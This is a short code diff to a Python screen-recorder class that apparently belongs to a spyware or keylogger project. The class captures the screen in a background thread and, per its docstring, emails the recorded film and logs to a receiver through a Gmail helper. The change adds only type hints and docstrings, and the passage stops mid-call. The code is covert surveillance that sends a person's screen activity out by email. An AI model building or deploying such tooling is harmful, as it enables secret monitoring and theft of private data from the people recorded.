@@ -4,10 +4,14 @@ import cv2
 from numpy import array
 from pyautogui import screenshot
 from win32api import GetSystemMetrics
+from ..messenger import Gmail
 
 
 class ScreenRecorder:
-    def __init__(self, video_length=5, gmail=None):
+    """
+    Captures screenshot frames to one .avi file with help of cv2.
+    """
+    def __init__(self, video_length: int = 5, gmail: Gmail = None) -> None:
         self.video_length = video_length
         self.gmail = gmail
         self.screen_recorder_file_location = self.gmail.screen_recorder_file_location
@@ -16,10 +20,16 @@ class ScreenRecorder:
         self.video_height = GetSystemMetrics(1)
         self.video_codec = cv2.VideoWriter_fourcc(*'XVID')
 
-    def start(self):
+    def start(self) -> None:
+        """
+        Starts screen capturing session
+        """
         Thread(target=self._start).start()
 
-    def _start(self):
+    def _start(self) -> None:
+        """
+        Captures screen and sends mail to email receiver with logs and film
+        """
         video_writer = cv2.VideoWriter(self.screen_recorder_file_location,
                                        self.video_codec,
                                        20.0,
